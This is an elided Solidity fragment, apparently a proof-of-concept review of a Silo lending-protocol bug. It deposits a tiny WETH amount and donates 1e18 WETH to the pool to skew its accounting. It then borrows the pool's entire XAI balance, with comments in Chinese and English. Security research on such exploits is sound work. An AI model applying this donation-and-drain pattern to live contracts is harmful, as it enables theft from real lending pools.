...
contract SiloBugFixReview{
    ...
    function run() external checkZeroAssetStorage {
        ...
        console.log("WETH interest rate before exploit = ", accrueInterest);//65536 000000000000000000 

        uint256 depositAmount = 1e5;
        uint256 donatedAmount = 1e18;

        WETH.approve(address(SILO), depositAmount);
        SILO.deposit(address(WETH), depositAmount, false);//抵押1e5;

        WETH.transfer(address(SILO), donatedAmount);// 转账1e18
    ...
    function run2() external {
        uint256 accrueInterest = SILO.accrueInterest(address(WETH));
        SILO.borrow(address(XAI), XAI.balanceOf(address(SILO)));//450000 000000000000000000
